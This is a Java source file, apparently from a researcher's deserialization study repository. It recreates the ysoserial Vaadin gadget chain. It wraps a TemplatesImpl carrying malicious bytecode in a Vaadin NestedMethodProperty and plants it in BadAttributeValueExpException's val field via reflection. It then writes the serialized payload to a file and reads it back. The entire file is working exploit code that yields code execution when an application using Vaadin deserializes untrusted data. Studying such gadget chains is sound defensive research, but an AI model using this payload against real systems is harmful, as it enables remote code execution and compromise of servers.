package org.su18.serialize.ysoserial.Vaadin;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import org.su18.serialize.utils.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

/**
 * @author su18
 */
public class Vaadin {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		PropertysetItem pItem = new PropertysetItem();

		NestedMethodProperty<Object> property = new NestedMethodProperty<>(tmpl, "outputProperties");
		pItem.addItemProperty("outputProperties", property);

		// 实例化 BadAttributeValueExpException 并反射写入
		BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
		Field                         field     = BadAttributeValueExpException.class.getDeclaredField("val");
		field.setAccessible(true);
		field.set(exception, pItem);

		SerializeUtil.writeObjectToFile(exception);
		SerializeUtil.readFileObject();
	}

}
